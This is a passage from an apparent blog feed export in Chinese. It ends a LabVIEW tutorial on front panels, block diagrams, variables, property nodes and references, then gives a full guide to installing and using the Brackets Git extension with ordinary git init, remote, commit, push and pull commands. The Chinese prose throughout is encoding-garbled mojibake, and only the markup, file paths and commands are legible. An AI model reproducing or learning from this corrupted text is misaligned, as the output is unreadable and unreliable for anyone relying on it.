éœ€æ˜¾ç¤ºçš„viç¨‹åºï¼Œå…¶<strong>å‰é¢æ¿</strong>å°†ä¸ä¼šåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­æ˜¾ç¤ºã€‚</p>
<p><img src="/assets/labview/keyWords/frontPanel.png" alt="Labview frontPanel"></p>
<h3 id="ç¨‹åºæ¡†å›¾"><a href="#ç¨‹åºæ¡†å›¾" class="headerlink" title="ç¨‹åºæ¡†å›¾"></a>ç¨‹åºæ¡†å›¾</h3><p><strong>ç¨‹åºæ¡†å›¾</strong>ä½œä¸ºviç¨‹åºçš„å¦ä¸€éƒ¨åˆ†ï¼Œç”¨äºå®ç°è½¯ä»¶åŠŸèƒ½ã€‚ä»å‰é¢æ¿è·å–ç”¨æˆ·æ•°æ®ï¼Œåœ¨<strong>ç¨‹åºæ¡†å›¾</strong>ä¸­è¿›è¡Œé€»è¾‘è¿ç®—ï¼Œå¹¶å°†è¿ç®—ç»“æœè¿”å›å‰é¢æ¿æˆ–å­˜å‚¨è‡³æœ¬åœ°æ–‡ä»¶ã€‚åœ¨æ¡†å›¾ä¸­ï¼Œå¼€å‘äººå‘˜å¯ä»¥é€šè¿‡å„ç§æ§åˆ¶ç»“æ„ï¼ˆé¡ºåºã€å¾ªç¯ã€æ¡ä»¶ã€äº‹ä»¶ã€å®šæ—¶ç­‰ï¼‰æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œé¡ºåºï¼Œé€šè¿‡è°ƒç”¨LabVIEWå†…ç½®å‡½æ•°åº“ä¸­çš„å¤§é‡å‡½æ•°å®ç°è½¯ä»¶åŠŸèƒ½ã€‚</p>
<p><img src="/assets/labview/keyWords/flowChart.png" alt="Labview flowChart"></p>
<h3 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h3><p>ä¸å…¶å®ƒç¼–ç¨‹è¯­è¨€ä¸€æ ·ï¼ŒLabVIEWä¹Ÿæœ‰<strong>å±€éƒ¨å˜é‡</strong>å’Œ<strong>å…¨å±€å˜é‡</strong>å±€éƒ¨å˜é‡**ä½œç”¨åŸŸä¸ºæœ¬viç¨‹åºï¼Œåªèƒ½åœ¨æœ¬viä¸­è°ƒç”¨ã€‚æœ¬viå¯åŠ¨æ—¶ï¼Œç³»ç»Ÿä¸ºå…¶åˆ†é…å†…å­˜ç©ºé—´ï¼›å½“æœ¬viç»“æŸè¿è¡Œåï¼Œç³»ç»Ÿé‡Šæ”¾å…¶å†…å­˜ã€‚</p>
<h3 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h3><p>å¯¹äºä¸€ä¸ªå¤šviçš„é¡¹ç›®è€Œè¨€ï¼Œå¦‚æœæŸä¸ªæˆ–æŸäº›å˜é‡éœ€è¦è¢«ä¸¤ä¸ªæˆ–å¤šä¸ªviè°ƒç”¨æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨<strong>å…¨å±€å˜é‡</strong>ã€‚è¯¥å˜é‡ä½œç”¨åŸŸä¸ºé¡¹ç›®ä¸­çš„æ‰€æœ‰viç¨‹åºï¼Œè½¯ä»¶å¯åŠ¨æ—¶ï¼Œç³»ç»Ÿä¸ºå…¶åˆ†é…å†…å­˜ç©ºé—´ï¼›è½¯ä»¶å…³é—­åï¼Œç³»ç»Ÿé‡Šæ”¾å…¶å†…å­˜ã€‚</p>
<p>æ ¹æ®æˆ‘çš„ç¼–ç¨‹ç»éªŒï¼Œå¯ä»¥ä¾æ®ä»¥ä¸‹å‡ ç§æƒ…å†µè€ƒè™‘æ˜¯å¦ä½¿ç”¨å…¨å±€å˜é‡ï¼š</p>
<ul>
<li>æŸå˜é‡ä»…è¢«ä¸€ä¸ªviè°ƒç”¨ï¼Œæ— éœ€è®¾å®šå…¨å±€å˜é‡ï¼›</li>
<li>æŸå˜é‡ä»…è¢«ä¸¤ä¸ªviè°ƒç”¨ï¼Œè€Œä¸”ä¸ä¼šé¢‘ç¹æ›´æ–°ï¼Œå¯ä»¥é€šè¿‡å‡½æ•°æ¥å£ä¼ é€’å‚æ•°ï¼Œæ— éœ€è®¾å®šå…¨å±€å˜é‡ï¼›</li>
<li>æŸå˜é‡è¢«3ä¸ªæˆ–3ä¸ªä»¥ä¸Šviè°ƒç”¨ï¼Œä¸”viä¹‹é—´æ²¡æœ‰å‡½æ•°æ¥å£ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å…¨å±€å˜é‡ï¼›</li>
<li>æŸå˜é‡è¢«ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„<strong>ç”¨æˆ·ç•Œé¢</strong>è°ƒç”¨ï¼Œå¤šä¸ªç•Œé¢å¯èƒ½å¹¶è¡Œæ‰§è¡Œï¼Œå¿…é¡»ä½¿ç”¨å…¨å±€å˜é‡ã€‚</li>
</ul>
<p><strong>æ³¨æ„</strong>ï¼šå…¨å±€å˜é‡ä¹Ÿæ˜¯ä»¥viå½¢å¼å­˜åœ¨ï¼Œä½†æ˜¯å®ƒåªæœ‰å‰é¢æ¿ï¼Œæ²¡æœ‰ç¨‹åºæ¡†å›¾ã€‚æ­¤å¤–ï¼Œå¤šä¸ªå…¨å±€å˜é‡å¯ä»¥æ”¾ç½®åœ¨åŒä¸€ä¸ªviä¸­ï¼Œæˆ‘ä»¬ä¹Ÿæ¨èè¿™ä¹ˆåšï¼Œè¿™æ ·å¯ä»¥å‡å°‘å…¨å±€viçš„ä¸ªæ•°ã€‚å¦‚æœé¡¹ç›®æ–‡ä»¶è¾ƒå°ï¼Œå…¨å±€å˜é‡ä¸ªæ•°è¾ƒå°‘ï¼Œå®Œå…¨å¯ä»¥åªç”¨ä¸€ä¸ªviæ–‡ä»¶å­˜å‚¨æ‰€æœ‰çš„å…¨å±€å˜é‡ï¼›å¦‚æœé¡¹ç›®æ¯”è¾ƒåºå¤§ï¼Œæ‰€éœ€çš„å…¨å±€å˜é‡è¾ƒå¤šï¼Œå¯ä»¥é€‚å½“å¢åŠ å…¨å±€viæ–‡ä»¶ä¸ªæ•°ï¼Œä½†ä¹Ÿåº”è¯¥å°†å…¨å±€å˜é‡å½’ç±»ï¼Œç›¸åŒæˆ–ç›¸ä¼¼åŠŸèƒ½çš„å˜é‡åº”æ”¾åœ¨ä¸€ä¸ªviä¸­ã€‚</p>
<h3 id="å±æ€§èŠ‚ç‚¹"><a href="#å±æ€§èŠ‚ç‚¹" class="headerlink" title="å±æ€§èŠ‚ç‚¹"></a>å±æ€§èŠ‚ç‚¹</h3><p>å­¦ä¹ LabVIEWè½¯ä»¶å¼€å‘<strong>å±æ€§èŠ‚ç‚¹</strong>ä¹Ÿæ˜¯å¿…é¡»æŒæ¡çš„ä¸€ä¸ªå†…å®¹ã€‚è¿™ä¸ªè¯å¯ä»¥åˆ†ä¸º&quot;å±æ€§&quot;å’Œ&quot;èŠ‚ç‚¹&quot;ä¸¤éƒ¨åˆ†ï¼Œå¯¹åº”å‰é¢æ¿çš„æ‰€æœ‰æ§ä»¶ï¼Œå³ä½¿æ˜¯ä¿®é¥°æ€§æ§ä»¶ä¹Ÿæœ‰å…¶å±æ€§ã€‚ä»¥æ•°å€¼è¾“å…¥æ§ä»¶ä¸ºä¾‹ï¼Œå…¶å±æ€§é…ç½®ç•Œé¢å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/assets/labview/keyWords/properties.png" alt="Labview properties"></p>
<p>å¼€å‘äººå‘˜å¯ä»¥åœ¨å±æ€§é…ç½®ç•Œé¢é…ç½®æ§ä»¶çš„é»˜è®¤å±æ€§ï¼Œè¯¥æ“ä½œé€‚ç”¨äºæ— éœ€å†æ¬¡æ›´æ”¹çš„å±æ€§ã€‚æ¯ä¸ªæ§ä»¶éƒ½æœ‰å…¶å¯ä¿®æ”¹çš„å±æ€§åˆ—è¡¨ï¼Œå¼€å‘äººå‘˜å¯ä»¥é€‰æ‹©æ§ä»¶æœ¬èº«æˆ–å…¶æ¥çº¿ç«¯ï¼Œé€šè¿‡ &quot;å³é”®&rarr;åˆ›å»º&rarr;å±æ€§èŠ‚ç‚¹&rarr;å±æ€§&quot; åˆ›å»ºæˆ–æŸ¥çœ‹è¯¥æ§ä»¶çš„å±æ€§é¡¹ã€‚</p>
<p><img src="/assets/labview/keyWords/node.png" alt="Labview node"></p>
<p>é™¤å±æ€§èŠ‚ç‚¹å¤–ï¼ŒLabVIEWä¸­è¿˜æœ‰å¤§é‡çš„&quot;èŠ‚ç‚¹&quot;ï¼Œå¦‚&quot;è¡¨è¾¾å¼èŠ‚ç‚¹&quot;å…¬å¼èŠ‚ç‚¹&quot;åé¦ˆèŠ‚ç‚¹&quot;è°ƒç”¨èŠ‚ç‚¹&quot;ç­‰ã€‚å¯¹&quot;å±æ€§èŠ‚ç‚¹&quot;è€Œè¨€ï¼Œå¯ä»¥ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œä»¥äººä¸ºä¾‹ï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥çœ‹åšä¸€ä¸ªèŠ‚ç‚¹ï¼ŒäººåŒ…å«&quot;å§“å&quot;èº«é«˜&quot;ä½“é‡&quot;æ€§åˆ«&quot;å¹´é¾„&quot;ç­‰å±æ€§ï¼Œé‚£ä¹ˆå±æ€§èŠ‚ç‚¹å°±å¯ä»¥ç†è§£ä¸ºåŒ…å«å¤šä¸ªå±æ€§çš„äººã€‚è¯»å†™&quot;å±æ€§èŠ‚ç‚¹&quot;å°±æ˜¯å¯¹è¯¥èŠ‚ç‚¹çš„æŸé¡¹å±æ€§è¿›è¡Œè¯»å†™æ“ä½œã€‚</p>
<h3 id="æ¥çº¿ç«¯"><a href="#æ¥çº¿ç«¯" class="headerlink" title="æ¥çº¿ç«¯"></a>æ¥çº¿ç«¯</h3><p>å¯¹äºå‰é¢æ¿ä¸Šçš„ä¸€ä¸ªæ§ä»¶è€Œè¨€ï¼Œå®ƒåœ¨å‰é¢æ¿ä»…å‡ºç°ä¸€æ¬¡ï¼Œä½†åœ¨ç¨‹åºæ¡†å›¾ä¸­å¯ä»¥å¤šç§æ–¹å¼å‡ºç°ï¼ŒåŒ…æ‹¬<strong>æ¥çº¿ç«¯</strong>å¼•ç”¨<strong>å±€éƒ¨å˜é‡</strong>å’Œ<strong>å±æ€§èŠ‚ç‚¹</strong>ï¼Œä½†æ¯ä¸ªæ§ä»¶çš„<strong>æ¥çº¿ç«¯</strong>æœ‰ä¸”åªæœ‰ä¸€ä¸ªï¼Œå…¶å®ƒæ–¹å¼åˆ™å¯ä»¥å¤šæ¬¡å‡ºç°æˆ–ä¸å‡ºç°<strong>æ¥çº¿ç«¯</strong>ä¸æˆ‘ä»¬æ‰€è¯´çš„é‡‡é›†å¡çš„æ¥çº¿ç«¯æ˜¯ä¸€ä¸ªé“ç†ï¼Œå®ƒæ˜¯ç¨‹åºæ¡†å›¾ä¸å‰é¢æ¿ä¹‹é—´ä¼ é€’å‚æ•°çš„æ¡¥æ¢ã€‚å½“æˆ‘ä»¬åˆ é™¤å‰é¢æ¿ä¸­çš„æŸä¸ªæ§ä»¶æ—¶ï¼Œå…¶ç¨‹åºæ¡†å›¾ä¸­çš„æ¥çº¿ç«¯ä¹Ÿä¼šéšä¹‹åˆ é™¤ï¼Œåä¹‹äº¦ç„¶ã€‚</p>
<p><img src="/assets/labview/keyWords/port.png" alt="Labview port"></p>
<h3 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h3><p>ä¸Šé¢æåˆ°çš„<strong>å¼•ç”¨</strong>ä¹Ÿæ˜¯éå¸¸å¸¸ç”¨çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå®ƒç›¸å½“äºC/C++ä¸­çš„<strong>æŒ‡é’ˆ</strong>ï¼Œé€šè¿‡å®ƒå¯ä»¥è·å–æ§ä»¶çš„è¯†åˆ«æ ‡è¯†ã€ä¿®æ”¹æ§ä»¶å±æ€§ç­‰ã€‚æœ€é‡è¦çš„ä¸€ç‚¹ï¼šå½“æˆ‘ä»¬æŠŠæ§ä»¶Açš„å¼•ç”¨ä½œä¸ºå‡½æ•°å‚æ•°ä¼ é€’è‡³æŸä¸ªå‡½æ•°åï¼Œè¢«è°ƒå‡½æ•°å¯¹è¯¥å¼•ç”¨çš„æ“ä½œç›´æ¥ä½œç”¨åœ¨æ§ä»¶Aä¸Šï¼Œè€Œä¸å†éœ€è¦å›è°ƒå‚æ•°æˆ–å…¨å±€å˜é‡çš„å‚ä¸ï¼Œè¿™æ˜¯éå¸¸é‡è¦å’Œå®ç”¨çš„åŠŸèƒ½ã€‚</p>
<h3 id="æ ‡ç­¾-amp-æ ‡é¢˜"><a href="#æ ‡ç­¾-amp-æ ‡é¢˜" class="headerlink" title="æ ‡ç­¾&amp;æ ‡é¢˜"></a>æ ‡ç­¾&amp;æ ‡é¢˜</h3><p>åœ¨å‰é¢æ¿ä¸­ï¼Œæ¯ä¸ªæ§ä»¶éƒ½æœ‰å¯¹åº”çš„<strong>æ ‡ç­¾</strong>å’Œ<strong>æ ‡é¢˜</strong>ï¼Œä¸¤è€…æ˜¯æœ‰åŒºåˆ«çš„ã€‚é»˜è®¤æ˜¾ç¤ºçš„æ˜¯æ ‡ç­¾ï¼Œè€Œä¸”æ ‡ç­¾å’Œæ ‡é¢˜çš„é»˜è®¤å€¼æ˜¯ä¸€æ ·çš„ã€‚åœ¨ç¨‹åºæ¡†å›¾ä¸­ï¼Œåªèƒ½æ˜¾ç¤ºæ§ä»¶çš„æ ‡ç­¾ï¼Œæ— æ³•æ˜¾ç¤ºå…¶æ ‡é¢˜ã€‚Ctrl+Hæ‰“å¼€æ§ä»¶çš„è¯´æ˜ä¿¡æ¯ï¼Œå…¶æ˜¾ç¤ºçš„æ—¢æœ‰æ ‡é¢˜ä¿¡æ¯ï¼Œåˆæœ‰æ ‡ç­¾ä¿¡æ¯ã€‚é€šå¸¸ï¼Œæ ‡ç­¾åç§°è¾ƒçŸ­ï¼Œç”¨äºç¨‹åºæ¡†å›¾ä½¿ç”¨ï¼›æ ‡é¢˜å¯ä»¥ç¨é•¿äº›ï¼Œåœ¨å‰é¢æ¿æ˜¾ç¤ºæ ‡é¢˜å¯ä»¥è¯¦ç»†æè¿°æ§ä»¶åŠŸèƒ½ï¼ŒåŒæ—¶æ”¾åœ¨å¸®åŠ©ä¿¡æ¯ä¸­æ–¹ä¾¿ç”¨æˆ·æŸ¥è¯¢ã€‚</p>
<p><img src="/assets/labview/keyWords/tag&amp;title.png" alt="Labview tag&amp;title"></p>
<p>ä¸åŒæ§ä»¶çš„æ ‡ç­¾å’Œæ ‡é¢˜éƒ½å¯ä»¥ç›¸åŒï¼Œä½†ä¸å»ºè®®è¿™æ ·åšï¼Œæ ‡ç­¾é€šå¸¸æ˜¯å”¯ä¸€çš„ï¼Œå”¯ä¸€æŒ‡å®šæŸä¸€ä¸ªæ§ä»¶ï¼Œç±»ä¼¼äºäººçš„å­¦å·ã€‚å¯¹æ ‡é¢˜çš„è¦æ±‚åˆ™å®½æ¾äº›ï¼Œå¯åŒå¯ä¸åŒã€‚</p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™é‡Œè®²è¿°äº†LabVIEWå¸¸ç”¨çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œå…¶å®ƒæœªæåŠçš„å¸¸ç”¨æ¦‚å¿µè¾ƒä¸ºç®€å•ï¼Œæˆ–æ˜¯ä»…å¯¹æŸäº›ç‰¹å®šæ§ä»¶æœ‰æ„ä¹‰ï¼Œè¿™å°±ä¸å¤šè¯´äº†ã€‚</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Brackets - Gitæ’ä»¶çš„ä½¿ç”¨æ–¹æ³•]]></title>
      <url>https://www.litreily.top/2016/05/15/brackets-git/</url>
      <content type="html"><![CDATA[<p>Bracketsï¼Œä¸€æ¬¾ä¸“èŒåšç½‘é¡µè®¾è®¡çš„å¼€å‘å·¥å…·ï¼Œå…¶æ’ä»¶ä¹Ÿæ˜¯æä¸ºä¸°å¯Œï¼ŒGitè‡ªç„¶æ˜¯å°‘ä¸äº†çš„ï¼Œé‚£ä¹ˆå¦‚ä½•å®‰è£…å’Œä½¿ç”¨å®ƒå‘¢ï¼Œæˆ‘ä»¥Windows 10ç¯å¢ƒä¸ºä¾‹è¿›è¡Œè¯´æ˜ã€‚</p>
<h2 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h2><h3 id="æ‰“å¼€æ’ä»¶ç®¡ç†å™¨"><a href="#æ‰“å¼€æ’ä»¶ç®¡ç†å™¨" class="headerlink" title="æ‰“å¼€æ’ä»¶ç®¡ç†å™¨"></a>æ‰“å¼€æ’ä»¶ç®¡ç†å™¨</h3><p>åœ¨Bracketsä¸­ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰çš„æ’ä»¶éƒ½å¯ä»¥ä»æ’ä»¶ç®¡ç†å™¨(Extension Manager)ä¸­å®‰è£…ï¼Œè¯¥ç®¡ç†å™¨å¯ä»¥ä»Bracketsè½¯ä»¶èœå•æ Fileä¸­æ‰¾åˆ°ã€‚</p>
<p><img src="/assets/brackets/git/extension manager.png" alt="Extension Manager"></p>
<h3 id="æœç´ å¹¶å®‰è£…gitæ’ä»¶"><a href="#æœç´ å¹¶å®‰è£…gitæ’ä»¶" class="headerlink" title="æœç´ å¹¶å®‰è£…gitæ’ä»¶"></a>æœç´ å¹¶å®‰è£…gitæ’ä»¶</h3><ul>
<li>æ‰“å¼€æ’ä»¶ç®¡ç†å™¨åï¼Œé€‰æ‹©â€œAvailableâ€é€‰é¡¹å¡ï¼Œåœ¨æœç´¢æ¡†ä¸­è¾“å…¥â€œgitâ€ã€‚</li>
</ul>
<p><img src="/assets/brackets/git/input git.png" alt="input git"></p>
<ul>
<li>åœ¨å¼¹å‡ºçš„åˆ—è¡¨ä¸­æ‰¾åˆ°â€œBrackets Gitâ€ï¼Œç‚¹å‡»â€œinstallâ€å¼€å§‹å®‰è£…ã€‚</li>
</ul>
<p><img src="/assets/brackets/git/install git.png" alt="install git"></p>
<ul>
<li>å®‰è£…å®Œæˆåï¼Œå°†æç¤ºâ€œInstallation successful!â€ã€‚</li>
</ul>
<p><img src="/assets/brackets/git/install success.png" alt="install success"></p>
<h3 id="æŸ¥çœ‹Gitæ’ä»¶"><a href="#æŸ¥çœ‹Gitæ’ä»¶" class="headerlink" title="æŸ¥çœ‹Gitæ’ä»¶"></a>æŸ¥çœ‹Gitæ’ä»¶</h3><p>å®‰è£…å®Œæˆåï¼Œå¯ä»¥åœ¨æ’ä»¶ç®¡ç†å™¨çš„â€œInstalledâ€é€‰é¡¹å¡ä¸­æŸ¥çœ‹å·²å®‰è£…çš„æ’ä»¶ã€‚</p>
<p><img src="/assets/brackets/git/installed extensions.png" alt="installed extensions"></p>
<p>æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬æƒ³çŸ¥é“å®ƒä¿å­˜åœ¨å“ªä¸ªåœ°æ–¹ï¼Œå¯ä»¥æ‰“å¼€æ–‡ä»¶èµ„æºç®¡ç†å™¨,åœ¨è·¯å¾„ï¼š</p>
<pre><code class="cmd">C:\\Users\USER_NAME\AppData\Roaming\Brackets\extensions\user
</code></pre>
<p>ä¸‹è¿›è¡ŒæŸ¥çœ‹ã€‚è¿™é‡Œä¿å­˜äº†ç”¨æˆ·å®‰è£…çš„æ‰€æœ‰æ’ä»¶ã€‚</p>
<p><img src="/assets/brackets/git/extensions.png" alt="extensions"></p>
<h2 id="ç•Œé¢å¸ƒå±€"><a href="#ç•Œé¢å¸ƒå±€" class="headerlink" title="ç•Œé¢å¸ƒå±€"></a>ç•Œé¢å¸ƒå±€</h2><h3 id="æ•´ä½“å¸ƒå±€"><a href="#æ•´ä½“å¸ƒå±€" class="headerlink" title="æ•´ä½“å¸ƒå±€"></a>æ•´ä½“å¸ƒå±€</h3><p>åœ¨Bracketså³ä¾§æ’ä»¶æ ä¸­å¯ä»¥æ‰¾åˆ°gitå›¾æ ‡ï¼Œç‚¹å‡»è¯¥å›¾æ ‡æˆ–ä½¿ç”¨å¿«æ·é”®<code>Ctrl+ALG+G</code>å¯ä»¥æ‰“å¼€æˆ–å…³é—­ç•Œé¢ä¸‹æ–¹çš„gitå·¥å…·ã€‚åœ¨ç•Œé¢å·¦ä¾§ï¼Œå½“æœ‰æ–‡ä»¶è¢«ä¿®æ”¹å¹¶ä¸”å°šæœª<code>commit</code>æ—¶ï¼Œæ–‡ä»¶åå‰é¢ä¼šå‡ºç°çº¢è‰²ç«–æ æ ‡è®°ï¼Œæ–‡ä»¶ä¸­è¢«ä¿®æ”¹çš„åœ°æ–¹ä¹Ÿä¼šå‡ºç°ç›¸åº”çš„æ ‡è®°ã€‚æ­¤å¤–ï¼Œåœ¨ç•Œé¢å·¦ä¾§ï¼Œé¡¹ç›®æ–‡ä»¶å¤¹ä¸‹æ–¹æœ‰ä¸€ä¸ªä¸‹æ‹‰é€‰é¡¹ï¼Œæ˜¾ç¤ºå½“å‰æ‰€åœ¨çš„gitåˆ†æ”¯ã€‚</p>
<p><img src="/assets/brackets/git/git layout.png" alt="git layout"></p>
<h3 id="å·¥å…·é¢æ¿"><a href="#å·¥å…·é¢æ¿" class="headerlink" title="å·¥å…·é¢æ¿"></a>å·¥å…·é¢æ¿</h3><p>gitå·¥å…·é¢æ¿æŒ‰åŒºåŸŸå¯åˆ†ä¸ºä¸¤å¤§å—ï¼Œä¸Šé¢æ˜¯æ§ä»¶æ ï¼Œä¸‹é¢æ˜¯å†…å®¹æŒ‡ç¤ºã€‚</p>
<p><img src="/assets/brackets/git/git tools.png" alt="git tools"></p>
<p>ä¸‹é¢æ˜¯å¯¹å„ä¸ªæ§ä»¶çš„ç®€è¦è¯´æ˜ï¼š</p>
<ul>
<li><img src="/assets/brackets/git/git%20clone.png" class="inline-img">:  åˆå§‹åŒ–/å…‹éš†é¡¹ç›®</li>
<li><img src="/assets/brackets/git/git%20commit.png" class="inline-img">ï¼š æäº¤å½“å‰æ›´æ”¹å†…å®¹</li>
<li><img src="/assets/brackets/git/git%20updown.png" class="inline-img">ï¼š è·³è‡³ä¸Šä¸€ä¸ª/ä¸‹ä¸€ä¸ªæ–‡ä»¶ä¿®æ”¹ä½ç½®</li>
<li><img src="/assets/brackets/git/git%20history.png" class="inline-img">ï¼š æ˜¾ç¤ºä»“åº“å†å²æäº¤è®°å½•/å½“å‰æ–‡ä»¶å†å²ä¿®æ”¹è®°å½•</li>
<li><img src="/assets/brackets/git/git%20refresh.png" class="inline-img">ï¼š åˆ·æ–°ä»“åº“å†…å®¹/æ›´å¤šæŒ‡ä»¤é€‰é¡¹</li>
<li><img src="/assets/brackets/git/git%20tag.png" class="inline-img">ï¼š æ·»åŠ æ ‡ç­¾</li>
<li><img src="/assets/brackets/git/git%20push.png" class="inline-img">ï¼š åˆ‡æ¢è¿œç¨‹ä»“åº“æº/fetch/pull/push</li>
<li><img src="/assets/brackets/git/git%20settings.png" class="inline-img">ï¼š æ‰“å¼€æŒ‡ä»¤çª—å£/Git Settingsç•Œé¢</li>
</ul>
<h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><h3 id="å…³è”Git-GUI"><a href="#å…³è”Git-GUI" class="headerlink" title="å…³è”Git GUI"></a>å…³è”Git GUI</h3><p>Bracketsçš„gitæ’ä»¶ä»…ä»…æ˜¯ä¸ªæ’ä»¶ï¼Œè¦ä½¿ç”¨gitè¿›è¡Œä»£ç ç®¡ç†ï¼Œå‰ææ˜¯ç”µè„‘å·²è£…æœ‰gitè½¯ä»¶ï¼Œå¦‚Windowsçš„git for Windowsï¼Œå®‰è£…æ–¹æ³•è¿™é‡Œä¸å¤šè¯´ã€‚å½“æˆ‘ä»¬å®‰è£…å¥½gitè½¯ä»¶å¹¶é…ç½®å¥½ç¯å¢ƒå˜é‡åï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒBracketsèƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«gitçš„å®‰è£…è·¯å¾„ï¼›å¦‚æœæ²¡æœ‰è¯†åˆ«ï¼Œå¯ä»¥æ‰‹åŠ¨è®¾ç½®ï¼Œæ‰“å¼€Git Settingsç•Œé¢ï¼Œé€‰æ‹©Git configurationé€‰é¡¹å¡ï¼Œåœ¨â€œPath to Git executableâ€è¾“å…¥gitçš„å®‰è£…è·¯å¾„ã€‚</p>
<p><img src="/assets/brackets/git/git setPath.png" alt="git settings"></p>
<h3 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h3><p>å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªä»“åº“ï¼Œéœ€è¦ä½¿ç”¨gitè¿›è¡Œç®¡ç†æ—¶ï¼Œé¦–å…ˆåº”è¯¥åœ¨å·¥ç¨‹ç›®å½•ä¸‹æ‰§è¡Œ<code>git init</code>æŒ‡ä»¤ï¼Œå¦‚æœä½¿ç”¨gitæ’ä»¶ï¼Œåˆ™åªéœ€åœ¨gitå·¥å…·é¢æ¿ä¸­ç‚¹å‡»â€œInitâ€æŒ‰é’®å³å¯ã€‚</p>
<p><img src="/assets/brackets/git/git init.png" alt="git init"></p>
<h3 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h3><p>ä¸ºäº†æ¨é€ä»£ç è‡³è¿œç¨‹ä»“åº“ï¼Œå¯ä»¥é€‰æ‹©Githubã€Codingç­‰å¸¦æœ‰Gitç®¡ç†å™¨çš„ç½‘ç«™ï¼Œæ–°å»ºé¡¹ç›®å¹¶å¤åˆ¶ä»“åº“ç½‘å€ã€‚ä¸ºäº†å®ç°:</p>
<pre><code class="bash">git remote add origin https://git.coding.net/litreily/svg-social.git
</code></pre>
<p>å¯ä»¥åœ¨Bracketsä¸­æ‰“å¼€gitå·¥å…·ï¼Œç‚¹å‡»å³ä¾§ç¬¬ä¸€ä¸ªæŒ‰é’®ï¼Œé€‰æ‹©â€œCreate new remote...â€ï¼Œç„¶åä¾æ¬¡è¾“å…¥ä»“åº“åç§°ä»¥åŠç½‘å€ï¼Œç¡®è®¤å³å¯ã€‚</p>
<p><img src="/assets/brackets/git/git remote.png" alt="git remote"></p>
<p><img src="/assets/brackets/git/git remote add.png" alt="git remote"></p>
<h3 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h3><p>å½“æˆ‘ä»¬éœ€è¦æäº¤å·²ä¿®æ”¹æ–‡ä»¶æ—¶ï¼Œå¯ä»¥æ‰§è¡Œ<code>git add File_name</code>/<code>git add .</code>ä»¥åŠ<code>git commit</code>ã€‚å¦‚æœä½¿ç”¨gitæ’ä»¶ï¼Œå¯ä»¥åœ¨gitå·¥å…·ä¸­å‹¾é€‰éœ€è¦æäº¤çš„æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»æäº¤æŒ‰é’®ï¼Œåœ¨å¼¹å‡ºçš„ç•Œé¢ä¸­è¾“å…¥æäº¤ä¿¡æ¯ï¼Œç‚¹å‡»ç¡®è®¤å³å¯ã€‚</p>
<p><img src="/assets/brackets/git/git commit files.png" alt="git commit"></p>
<h3 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h3><p>åœ¨è”ç½‘æƒ…å†µä¸‹ï¼Œå¦‚æœéœ€è¦å°†ä»£ç æ¨é€è‡³è¿œç¨‹ä»“åº“ï¼Œéœ€è¦ä½¿ç”¨æŒ‡ä»¤<code>git push</code>,å¦‚ï¼š</p>
<pre><code class="bash">git push origin master
</code></pre>
<p>å¦‚æœä½¿ç”¨gitæ’ä»¶ï¼Œå¯ä»¥ç‚¹å‡»æ¨é€æŒ‰é’®ï¼Œé¦–æ¬¡æ¨é€éœ€è¦å¡«å†™ç”¨æˆ·åå’Œå¯†ç ï¼Œå³è¿œç¨‹ä»“åº“å¯¹åº”çš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p><img src="/assets/brackets/git/git push files.png" alt="git push"></p>
<p><img src="/assets/brackets/git/git push success.png" alt="git push"></p>
<h3 id="git-pull-git-fetch"><a href="#git-pull-git-fetch" class="headerlink" title="git pull / git fetch"></a>git pull / git fetch</h3><p>å¦‚æœç”¨æˆ·åœ¨è¿œç¨‹ä»“åº“ä¿®æ”¹äº†ä»£ç æˆ–æ·»åŠ äº†æ–°çš„æ–‡ä»¶ï¼Œæ­¤æ—¶å¯ä»¥åœ¨æœ¬åœ°ä½¿ç”¨æŒ‡ä»¤<code>git pull</code>è·å–æ›´æ–°æ–‡ä»¶ï¼Œå¦‚ï¼š</p>
<pre><code class="bash">git pull origin master
</code></pre>
<p>å¦‚æœä½¿ç”¨gitæ’ä»¶ï¼Œå¯ä»¥ç‚¹å‡»æ‹‰å–æŒ‰é’®ã€‚</p>
<p><img src="/assets/brackets/git/git pull.png" alt="git pull"></p>
<p><img src="/assets/brackets/git/git pull success.png" alt="git pull"></p>
<p>æŒ‡ä»¤<code>git fetch</code>çš„æ“ä½œæ–¹æ³•ç±»ä¼¼ï¼Œè¾ä¸èµ˜è¿°ã€‚</p>
